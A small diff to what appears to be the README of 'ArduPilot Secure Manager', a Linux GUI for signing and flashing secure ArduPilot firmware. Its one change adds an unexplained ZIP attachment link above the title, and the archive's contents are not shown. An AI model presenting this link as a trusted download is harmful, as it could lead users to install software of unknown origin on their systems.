@@ -1,3 +1,4 @@
+[ArduSecureManager.zip](https://github.com/user-attachments/files/28925041/ArduSecureManager.zip)
 # 🔐 ArduPilot Secure Manager
 
 ArduPilot Secure Manager is a Linux-based GUI application that simplifies the complete ArduPilot Secure Firmware workflow. It provides an easy-to-use interface for generating cryptographic keys, building secure bootloaders, signing firmware, and flashing secured firmware to supported flight controllers.
